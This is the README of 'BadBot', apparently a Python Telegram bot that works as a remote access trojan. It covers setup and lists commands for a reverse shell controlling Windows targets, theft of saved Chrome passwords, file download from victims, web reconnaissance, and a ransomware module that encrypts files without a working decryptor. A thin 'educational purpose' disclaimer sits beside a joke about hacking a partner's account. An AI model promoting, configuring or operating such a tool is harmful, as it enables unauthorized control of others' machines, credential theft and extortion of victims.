# The Badbot Project By Aman Singh
![GitHub Logo](/image.jpg) 
# Badbot
## Description
BadBot is a simple telegram bot written in python. It provides a reverse shell which can be use to command and control
any windows target machine. it also provides post exploitation like: -
1. chrome passoword extraction
2. image view 
3. document download 

It also gives some basic web application scanning tools like: - 
1. tracert 
2. dnslookup
3. nping 
4. whois
5. pagelinks
6. zone transfer

## Installation
***step 1:*** make sure that you have python 3 installed already on your pc.

***step 1.1*** type command pip install virtualenv

***step 1.2*** active your virtual environment

***step 2:*** type command pip install requirements.txt

***Additional files:*** to compile payload in windows install these packages, ignore it if you are using linux. pypiwin32==223 or pywin32==227


***step 3:*** edit the config file for changes 

```python
api = '<Your api Key>'
telegram_chat_id = '<your telegram Bot ID>'
```
***step 4:*** create a loot folder inside your main directory

***step 5:*** run command: python badBod.py

> It is always recommended to create an executable before running this application avoid some bugs...

## how to use

after running badBot.py you can directly got to telegram app and start sending commands to it.

***MAIN COMMANDS :-***
```telegram
/start - say hello to BadBot
/listen - start listening for targets(blocking message)
/client - list all the available targets
/select - select a target eg.(/select 1)
/rst - restart bot server 
```
>you can directly send shell commands as messages

***POST EXPLOIT COMMANDS :-***
```
/image - download and view an image eg.(/image file.jpg)
/download - document download eg.(/download file.doc)
/cpass - extract saved chrome passwords
/loot - check all your loots
/lootera - download a loot file eg.(/loot filename.ext)
```

***WEB APP RECON :-***
```
/seturl - set a target website
/geturl - check current target website
/tracert - trace route
/dnslookup - find dns record for a domain
/nping - test connectivity to a host
/whois - determine registered owner
/pagelinks - dump all links from the webpage
/zonetransfer - test for zone transfer 
/help - view this menu
```
***RANSOMWARE MODULE COMMANDS :-***
```
/set_password - assign password for your encryptor
/get_keys - retrieve password salt and key
/keygen - generate keys (if no password then random key)
/encrypt - start encrypting files
```
***!!!!WARNING BEFORE USE RANSOMWARE!!!!***

- This module will encrypt all your files.

- Decrypting module is not available (in development). 

- keys are saved in loot directory with corresponding ip and hostname.

- If anything goes wrong then developer of this project is not resposible..

## Conclusion
>this bot is only meant for educational purpose. So, please don't try to hack your girlfriend's / boyfriend's account with this application
